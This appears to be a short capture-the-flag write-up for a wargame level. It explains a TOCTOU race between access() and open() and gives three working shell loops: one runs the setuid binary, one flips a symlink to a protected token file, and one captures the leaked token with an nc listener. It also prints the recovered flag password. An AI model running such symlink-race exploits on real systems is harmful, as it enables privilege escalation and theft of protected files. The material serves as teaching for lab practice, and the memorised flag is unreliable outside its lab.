The level was solved using a race condition technique, where the attack exploits the time gap between when the server checks access permissions and when it uses the file,
even if that gap is only milliseconds. In this level, the access system call checks the permissions of the real file linked by a symlink
, while the open system call is used without the O_NOFOLLOW flag, meaning it follows symlinks.
This creates a TOCTOU (Time of Check, Time of Use) vulnerability because access is called before open,
allowing an attacker to switch the symlink between the check and the use.
3 scripts was created in each teminal :

    first terminal:

    
  "while true;
    do ./level10  /tmp/tocto 127.0.0.1 sleep 0.001 
done;"


 second terminal :

 *create a file that receives the flag from the server '
 
 "    echo "hello from test file ._." > /tmp/file    "
 
" while true;
   do 
 ln -sf /tmp/file /tmp/tocto
sleep 0.020
ln -sf /home/user/level10/token /tmp/tocto
sleep 0.030
done;"


third terminal : 

"while true; 
do     
nc -l 6969 | tee /tmp/receivedToken
cat /tmp/receivedToken
done;
"

flag10 : "woupa2yuojeeaaed06riuj63c"

cd /home/flag
su flag10
and then call getflag to get token for level11
